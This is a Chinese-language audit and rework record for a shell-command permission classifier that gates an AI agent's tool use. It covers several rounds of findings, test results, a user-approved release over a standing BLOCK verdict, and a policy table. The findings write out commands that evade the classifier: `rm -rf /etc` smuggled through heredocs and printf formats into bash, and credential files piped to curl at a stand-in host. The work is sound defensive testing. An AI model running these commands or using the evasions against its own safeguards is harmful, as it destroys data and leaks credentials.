>   grammar 将正文保存为 heredoc 数据，`ShellParse.analyze` 输出 `Redirect.content`，随后进入 `evaluateCommand`。
> - Source evidence: `packages/opencode/src/shell/parse.ts:138` 保存正文；`packages/opencode/src/permission/precheck.ts:612` 仅为 Python／Node 消费直接重定向正文；Bash 随后在 `packages/opencode/src/permission/precheck.ts:787` 返回无明文脚本的 ask 标记，并被转换为 general。`packages/opencode/src/permission/precheck.ts:563` 的 Shell 源码递归仅覆盖管道生产者，不能覆盖直接重定向。
> - Canonical-plan evidence: §10.8，尤其 `docs/plans/permission-semantic-token-classification.md:508`，明确包含已有 Shell 消费者的字面 stdin。
> - Responsibility owner: 预检的解释器输入绑定与 `evaluateCommand`。
> - Concrete consequence: 该输入中的保护目录删除由原 forbidden 降为 general，默认 auto 路由直接允许。`bash <<< 'rm -rf /etc'` 存在同一缺口。
> - Why this is not speculative: Bash grammar 的 heredoc 正文结构见 `node_modules/tree-sitter-bash/grammar.js:565`；普通正文不会自动形成外层 command 节点。当前实现没有其他正文消费入口可以补回风险。
> - Minimal correction direction: 将实际由 Shell stdin 消费的已提取正文接入既有 Shell 分类主路径，保持文件入口和数据消费者的边界，补充与 `cat` 数据场景成对的测试。
>
> ### B-03 凭据外传管道误用了本地读取的较窄路径集合
>
> - Violated invariant: INV-03、INV-05；迁移不得收窄既有凭据外传分类。
> - Evidence class: reachable。
> - Producer and execution path: 工作目录中的 `server.pem` 经 `cat server.pem | curl --data-binary @- https://example.test/upload` 进入预检；管道规则调用 `readsSensitivePath`。
> - Source evidence: `packages/opencode/src/permission/precheck.ts:551` 使用本地读取谓词；其经 `packages/opencode/src/permission/precheck.ts:1400` 到达 `hasSensitivePath`，在 `packages/opencode/src/permission/precheck.ts:1441` 对 `.pem/.key` 额外要求安全上下文。原外传路径集合仍在 `packages/opencode/src/permission/precheck.ts:130` 明确覆盖无此上下文的 `.pem/.key`；已读取的 HEAD diff 证明旧管道规则使用该完整集合。
> - Canonical-plan evidence: §12.1 的“敏感读取到 HTTP 工具”迁移合同；§25 P07 保留原管道政策，未授权收窄。
> - Responsibility owner: 预检的凭据外传管道规则。
> - Concrete consequence: 上述实际上传命令从 dangerous 降为 general，失去 reviewer 审查及原 `credential read piped to network transfer` 原因。单独读取 `server.pem` 保持 safe 的例外被错误扩展到了外传上下文。
> - Why this is not speculative: 文件位于工作目录、命令采用现有支持的 producer／consumer，且 `curl --data-binary @-` 实际消费 stdin；没有依赖未知工具或新增权限族。
> - Minimal correction direction: 保留参数角色绑定，但让外传规则消费原外传路径集合；分别锁定本地读取与真实上传的不同等级。
>
> ## Non-blocking findings
>
> - 异步 auto 接线及 reviewID 测试调整符合当前调用时序，未发现该处改变审批政策。
> - 部分邻近注释仍描述已删除的 raw 扫描或手写 tokenizer，例如 `packages/opencode/src/tool/shell.ts:999`。这些说明需要与新 owner 对齐。
> - 方案中的测试、构建及注释比例记录属于 builder 记录，本轮未将其直接视为独立验证通过。
>
> ## Rejected speculation
>
> - 不要求增加变量求值、导入别名跟踪、新删除 API、缓存策略或授权评分门槛。
> - 不因 Babel 位于 devDependencies 就推定发布失败。
> - 不将工作树中无关的 notebook／thirdparty 改动计入本次权限实现缺陷。
> - 不要求恢复 raw 全文扫描作为解析失败后的备用成功路径。
>
> ## Requirement and traceability coverage
>
> 已审查 R6、四个生产文件、两个测试文件及相关 producer／consumer，并对照 HEAD `3f0981d2c32f6e3439182bf348b47e04834ae8fd`。
>
> - 原始重定向事故已有 argv／redirect 分离路径及完整 SSH 文本回归。
> - 搜索数据、选项值、源码字符串、两项用户授权的变量删除目标均有对应实现和测试。
> - 引用执行名、直接 Shell stdin、外传路径集合分别存在 B-01、B-02、B-03，权限守恒尚未成立。
> - 原路由、strict、reviewer 和缓存 owner 保持原位；上述分类回归仍会改变它们实际收到的等级。
> - 本轮发现基于源码和 grammar 的可达性证明，尚未通过运行探针复现，未标记为 observed。
>
> ## Primary-path and fallback verdict
>
> 共享 grammar → 语法事实 → 原规则分类的方向符合责任划分，未发现新增“解析失败后换另一套解析器”的路径。
>
> 当前主路径仍漏掉真实执行事实，并在外传规则中使用了错误的既有路径集合。需在对应 owner 修正，不能通过恢复宽扫描补偿。
>
> ## Code quality and Chinese-comment verdict
>
> - 已独立运行限定范围的 `git diff --check`，通过。
> - 已确认涉及四个生产文件；物理生产差异为新增 628 行、删除 865 行，包含新增 `parse.ts`、注释和空行。该数字不能直接代替方案的有效代码预算。
> - **实际 E、合格 C、C/E 及有效生产代码预算尚未完成独立核算。** 不采纳方案记录的 `1284 / 199` 作为本轮计算结果。
> - 测试、类型检查和分类探针未运行：本会话要求非 Git shell 命令先获授权，前述授权请求尚未得到确认。因此这些硬门槛保持未验证，不声明通过。
>
> ## Release verdict
>
> **BLOCK — 当前 R6 实现不可放行。**
>
> B-01 至 B-03 均有当前可达路径证据。运行验证和 E/C 核算仍待授权完成，本答复不代表完整实现验收已经结束。本轮未修改任何文件。

返工核对：三项均属于Token迁移的事实遗漏或原规则接线差异。B-01在公开evaluate测试观察general后修复为原cautious/forbidden；B-02观察general后接回同一Shell路径，cat与脚本文件对照通过；B-03观察外传general后恢复原完整外传路径集合，本地读取与rg模式数据保持原等级。绑定器两种选项写法共用原取值记录，保持相同消费语义及四文件1000行预算。

返工验证：`bun test test/permission/precheck.test.ts test/permission/auto.test.ts --timeout 30000`为156 pass、0 fail、730 assertions。最新包级`bun typecheck`出现并行notebook测试的4个unknown类型错误，位置为`test/plugin/vscode-notebook-tool-summary.test.ts:186,298,303,621`；git status显示该文件及notebook bridge由其他工作修改，本任务保持这些文件原样。前一轮包级类型检查通过，最终验收继续等待共享工作区类型检查恢复。

### 第二轮：R6

Invocation：`ses_f562b90c1ffeDDrga6vQd2tuVP`，完整R6范围。审计发现标题和放行结论原文：

> ### B-04 Python 相邻字符串字面量使原删除规则失效
> ### B-05 printf 的普通格式化输出被错当成格式字符串源码
> ### B-06 新包装器路径使旧 env 解析分支和 helper 成为死代码
> ### B-07 实际中文解释比例未达到权威政策的 15% 要求
>
> **上一轮 B-01、B-02、B-03 的具体缺陷关闭。** 命令名 literal 外壳、直接 Shell stdin、外传路径集合已接回对应 owner；新增回归在本轮独立测试中通过。
>
> **预算通过；中文解释门槛、死代码清理及包级类型检查尚未通过。**
>
> **BLOCK — 当前 R6 实现仍不可放行。**
>
> 上一轮三项具体问题已修复；本轮 B-04 至 B-07 及包级类型检查门槛仍需处理。返工后须进行下一轮完整范围审计。本轮未修改文件、索引或提交。

B-04/B-05归属已有源码/载荷Token语义：公开evaluate分别观察到相邻字符串general、printf格式cautious，修复后保护路径forbidden，普通路径cautious及输出数据对照通过。B-06在directStart复用原pierceEnvTokens，删除不可达unwrap env分支，保持同一argv路径。B-07按新增/修改注释重新计量，更新过时raw测试说明。其余规则范围保持R6用户授权。

第二轮返工后验证：预检与auto为158 pass、0 fail、737 assertions；权限目录为310 pass、0 fail、1113 assertions；shell为204 pass、0 fail、742 assertions；包内`bun typecheck`恢复exit 0。notebook文件保持其他工作的修改，本任务未介入。共享grammar与Babel入口再次编译成功，产物运行检查接续完成。

### 第三轮：R6

Invocation：`ses_f562b90c1ffeDDrga6vQd2tuVP`。完整R6范围，四生产文件与两测试文件。发现分类及放行结论原文：

> ### B-05 printf 载荷的原权限范围仍未完整保留
>
> 上一轮 `%s\n` 样例已修复，但同一不变量仍存在可达缺口。
>
> - Violated invariant: INV-03、INV-04；迁移不得把已有可见危险载荷降为普通管道审查。
> - Evidence class: reachable。
> - Producer and execution path: `printf '%b' 'rm -rf /etc' | bash` → printf 输出提取 → 解释器 stdin 分类。
> - Source evidence: `packages/opencode/src/permission/precheck.ts:716` 遇到 `%b` 直接返回 undefined；`packages/opencode/src/permission/precheck.ts:558` 因此跳过载荷递归，只剩 `packages/opencode/src/permission/precheck.ts:551` 的 cautious 管道规则。
> - Concrete consequence: 示例参数没有转义，`%b` 实际输出原样的删除命令。旧规则将其判为 forbidden，当前实现降为 cautious，终局拒绝变成可审查放行。
>
> ### B-08 Bash 包装器载荷继承外层 PowerShell 方言，丢失命令替换
>
> - Violated invariant: INV-02、INV-03、INV-04；显式包装器载荷必须按实际执行它的语言解释。
> - Evidence class: reachable。
> - Producer and execution path: PowerShell ShellTool 请求携带 `metadata.shell="pwsh"`，命令为：
>   ```powershell
>   bash -c 'echo `rm -rf /etc`'
>   ```
>   外层单引号保留 Bash 源码 → `unwrap` 提取 `-c` 载荷 → `evaluateShell` 递归。
> - Source evidence: `packages/opencode/src/permission/precheck.ts:656` 只为 PowerShell 和 cmd 指定新方言，Bash 使用原来的 `dialect`；`packages/opencode/src/shell/parse.ts:33` 因此选择 PowerShell grammar。
>
> ## Non-blocking findings
>
> - B-01、B-02、B-03 的关闭状态保持；本轮回归继续通过。
> - **B-04 关闭**：Python 相邻字面量进入同一目标提取路径，保护路径、普通路径和字符串数据对照通过。
> - **B-06 关闭**：不可达的 unwrap env 分支已删除，`pierceEnvTokens` 由 `directStart` 实际消费。
> - **B-07 关闭**：本轮独立核算的合格中文解释比例达到权威政策的 15%。
> - 上轮包级类型检查阻塞已解除，本轮 `bun typecheck` 通过。
>
> 代码预算、中文解释比例、类型检查和本轮回归门槛通过；行为权限守恒仍被 B-05、B-08 阻断。
>
> ## Release verdict
>
> **BLOCK — 当前 R6 实现不可放行。**
>
> 本轮为第 **3** 轮实现审计，已达到政策规定的迭代上限。**B-05、B-08 保持阻断，并作为待用户决策的开放事项保留**；不能因达到轮次上限而降级或默认批准，也不自动启动第四轮。
>
> 本轮未修改任何文件、索引或提交。

第三轮独立计量：生产1000行、4文件；E=1268、C=202、15.93%。独立权限目录310 pass，shell204 pass，Session相关15 pass/13 skip，包级类型检查与限定diff whitespace检查均通过。最终编译smoke六项断言通过，Bash冷启动约215ms、Babel首次约144ms，其他样本约2–3.4ms。

用户对“是否授权只修复这两处并增加一轮完整实现审计”的选择原文为“修复并追加一轮”。据此进行B-05/B-08定向返工：printf的%b与%s共享占位及重复格式机制，%b单独解释参数换行等转义；显式Shell包装器和管道消费者采用内层Bash grammar，外层方言仍负责argv。两项各自红测复现后，预检与auto回归159 pass、0 fail、741 assertions，包内类型检查exit 0。生产代码增删维持1000行，4文件；第四轮为用户追加授权的完整实现审计。

### 第四轮：用户追加授权的R6实现审计

Invocation：`ses_f562b90c1ffeDDrga6vQd2tuVP`。完整R6范围，发现分类及放行结论原文：

> ### B-05 printf 的格式修正仍按个别样例覆盖，原权限降级仍可达
>
> `%b` 的上一轮样例已修复，但带静态宽度的同一字符串转换仍丢失载荷。
>
> - Violated invariant: INV-03、INV-04；Token 迁移必须保留已有可见危险操作的等级。
> - Evidence class: reachable。
> - Producer and execution path: ShellTool 接受命令字符串 → `printfOutput` 提取输出 → Bash stdin 分类。具体命令：
>   ```bash
>   printf '%10s' 'rm -rf /etc' | bash
>   ```
> - Source evidence: `packages/opencode/src/permission/precheck.ts:716` 用 `/%%|%./g` 把 `%10s` 识别成 `%1`；`packages/opencode/src/permission/precheck.ts:717` 随即返回 undefined。`packages/opencode/src/permission/precheck.ts:558` 因此跳过载荷分类，只保留 `packages/opencode/src/permission/precheck.ts:551` 的 cautious 管道规则。
> - Concrete consequence: `%10s` 指定最小宽度，不截断字符串；这里的载荷长度为 11，输出与 `%s` 完全相同。实际送入 Bash 的仍是保护目录删除命令，而分类由原 forbidden 降为 cautious，终局拒绝变为可审查放行。
>
> **B-08 关闭**：显式 Shell 包装器和 Shell 管道消费者已选用内层 Bash grammar；PowerShell 外层引用仍由外层解析。执行／数据对照测试通过。
>
> ## Release verdict
>
> **BLOCK — 当前 R6 实现仍不可放行。**
>
> B-08 已关闭，B-05 保持阻断。用户追加授权的这一轮完整实现审计已完成；剩余问题作为阻断开放事项交回用户，不自动延长审计轮次，也不将测试全绿等同于权限守恒已成立。
>
> 本轮未修改文件、索引或提交。

本轮独立验证：权限311 pass、shell204 pass、Session相关15 pass/13 skip，类型检查及diff whitespace通过。生产4文件1000行；E=1274、C=206、16.17%。其余B-01至B-04、B-06至B-08均保持关闭。当前剩余决定是printf字符串转换的静态格式覆盖及额外审计授权，代码和提交保持等待状态。

第四轮后的用户边界决定：针对“printf '%10s' 的静态宽度……当前只落 cautious，未保留原 forbidden……是否继续修复字符串格式的宽度/精度绑定，并授权一轮完整实现审计？”用户原文为“不管这个，这个本质上已经没有任何问题，我也不希望进行修改。”因此带宽度/精度格式采用当前cautious管道审查，属于用户知情接受的分类边界，printf实现保持原样。本项决定仅适用于已展示的格式覆盖边界，其余迁移合同继续有效。

第四轮复议仍保留审计原结论：**BLOCK — 针对初始需求及原 R6 合同，维持第四轮结论。** 代码与前轮验证结果保持一致。

最终发布授权：向用户明确说明“覆盖原须审计APPROVE的提交门槛，保留已知边界、测试结果和审计原结论，精确提交本任务文件”后，用户选择原文为“接受差异并提交”。用户进一步要求“请注意，状态应当写成 Approved by User。”据此以`Approved by User`记录当前版本放行；独立审计BLOCK作为历史真实结果保留，本次提交依据为用户发布决定。

---

## 25. 用户政策选择

本节仅收集额外政策变化，当前Token等价迁移采用HEAD原政策。填写A为授权该项变化，R为沿用原政策，空白为待决定。各项在完整旧规则核对后填写真实条件与完整reason；旧实现的自述和旧审计要求分别保存在封存记录中。

| 编号 | 触发条件与匹配格式 | 具体命令 | 原分类和reason | 拟议结果和reason | 修改原因及影响范围 | 用户决定A/R |
| --- | --- | --- | --- | --- | --- | --- |
| P01 | 原cautious操作增加用户授权评分校验；匹配Git commit等操作，reviewer返回allow但user_authorization非high | `git commit -m update` | cautious，`git state-changing command requires explicit approval`；最终由原reviewer政策及原返回值校验决定 | 代码改为deny，reason拟为`this operation requires explicit user authorization; goal-level authorization is insufficient` | 将明确授权从模型政策变成硬分数门槛，可能否决reviewer的allow；本轮保留原行为 | |
| P02 | 普通HTTP工具统一升级 | `curl https://example.test` | general，`unknown shell command` | cautious，拟为`network transfer requires review` | 普通请求会增加模型审批次数；本轮保留general | |
| P03 | 普通文件重定向/tee统一升级 | `echo hello > out.txt` | general，`opaque shell segment requires explicit approval`；原level决定默认allow | cautious，拟为`file redirection writes require explicit approval` | 将通用文件输出升级审查；本轮保留普通general及原专项持久化规则 | |
| P04 | 语法错误或动态参数增加强制审查 | `git status "$ARG"` | 原general，`opaque shell segment requires explicit approval` | cautious，拟为`dynamic argument requires review` | 以解析状态增加审批；本轮保留原等级规则 | |
| P05 | wipefs -o/--offset增加Forbidden | `wipefs --offset 0 /dev/example` | cautious，`disk partition inspection is read-only` | forbidden，`disk formatting or partition table destruction is irreversible` | 原写盘判据只有-a/--all，此项增加操作模式；本轮保留原判据 | |
| P06 | 明确授权类cautious请求每次绕过会话缓存 | 两次完全相同的`git add file`请求 | 原cautious reviewer allow可写缓存并复用；命中时由Permission缓存路径返回 | 每次review；没有独立预检reason，沿用`git state-changing command requires explicit approval` | 改变重复请求审批频率；本轮保持原缓存合同 | |
| P07 | 凭据读取管道增加必须显式上传stdin条件 | `cat .env \| curl https://example.test` | dangerous，`credential read piped to network transfer` | 仅敏感读取cautious，`sensitive file read requires explicit approval` | 限定真正上传可降低误报，同时收窄旧政策；本轮保留原工具集合与管道规则 | |
| P08 | 解码工具管道按编码/解码模式细分 | `base64 file \| sh` | dangerous，`decoded/decompressed payload piped to interpreter` | 编码模式保持普通general/原可见载荷规则；仅解码模式保留dangerous | 原规则按工具族，此项改变模式范围；本轮保留原工具族匹配 | |
| P09 | 已识别os.remove或fs.unlinkSync成员调用，目标为变量名 | `python -c 'os.remove(path)'`；`node -e 'fs.unlinkSync(path)'` | general，`interpreter eval command requires explicit approval` | cautious；Python为`Python file deletion requires explicit approval`，Node为`interpreter file deletion requires explicit approval` | 用户明确指定这两个调用进入普通删除审查；复用现有事实与分级流程，其他API和政策沿用既定范围 | A：用户本轮明确授权 |
